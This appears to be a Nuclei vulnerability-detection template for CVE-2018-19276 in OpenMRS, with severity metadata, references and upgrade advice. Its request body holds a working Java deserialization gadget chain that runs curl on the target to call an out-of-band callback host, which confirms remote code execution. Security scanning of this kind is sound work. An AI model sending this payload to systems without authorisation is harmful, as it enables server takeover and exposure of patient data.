http:
- matchers:
  - condition: and
    dsl:
    - contains(interactsh_protocol, "dns")
    - contains(content_type, "application/json")
    - contains(body, "message\":")
    type: dsl
  payloads:
    path:
    - ''
    - /openmrs
  raw:
  - "POST {{path}}/ws/rest/v1/xxxxxx HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml\n\
    \n<map>\n  <entry>\n    <groovy.util.Expando>\n      <expandoProperties>\n   \
    \     <entry>\n          <string>hashCode</string>\n          <org.codehaus.groovy.runtime.MethodClosure>\n\
    \            <delegate class=\"java.lang.ProcessBuilder\">\n              <command>\n\
    \                <string>curl</string><string>{{interactsh-url}}</string>\n  \
    \            </command>\n              <redirectErrorStream>false</redirectErrorStream>\n\
    \            </delegate>\n            <owner class=\"java.lang.ProcessBuilder\"\
    \ reference=\"../delegate\"/>\n            <resolveStrategy>0</resolveStrategy>\n\
    \            <directive>0</directive>\n            <parameterTypes/>\n       \
    \     <maximumNumberOfParameters>0</maximumNumberOfParameters>\n            <method>start</method>\n\
    \          </org.codehaus.groovy.runtime.MethodClosure>\n        </entry>\n  \
    \    </expandoProperties>\n    </groovy.util.Expando>\n    <int>1337</int>\n \
    \ </entry>\n</map>\n"
  stop-at-first-match: true
id: CVE-2018-19276
info:
  author: DhiyaneshDK
  classification:
    cpe: cpe:2.3:a:openmrs:openmrs:*:*:*:*:*:*:*:*
    cve-id: CVE-2018-19276
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-502
    epss-percentile: 0.99786
    epss-score: 0.93228
  description: 'OpenMRS before 2.24.0 is affected by an Insecure Object Deserialization
    vulnerability that allows an unauthenticated user to execute arbitrary commands
    on the targeted system via crafted XML data in a request body.

    '
  impact: 'Unauthenticated attackers can execute arbitrary system commands via insecure
    object deserialization, leading to complete server compromise and access to sensitive
    patient data.

    '
  metadata:
    max-request: 2
    product: openmrs
    shodan-query: html:"OpenMRS"
    vendor: openmrs
    verified: true
  name: OpenMRS Platform < 2.24.0 - Insecure Object Deserialization
  reference:
  - http://packetstormsecurity.com/files/155691/OpenMRS-Java-Deserialization-Remote-Code-Execution.html
  - https://know.bishopfox.com/advisories/news/2019/02/openmrs-insecure-object-deserialization
  - https://nvd.nist.gov/vuln/detail/CVE-2018-19276
  remediation: 'Upgrade to OpenMRS Platform version 2.24.0 or later.

    '
  severity: critical
  tags: cve,cve20218,openmrs,deserialization,rce,vkev,vuln
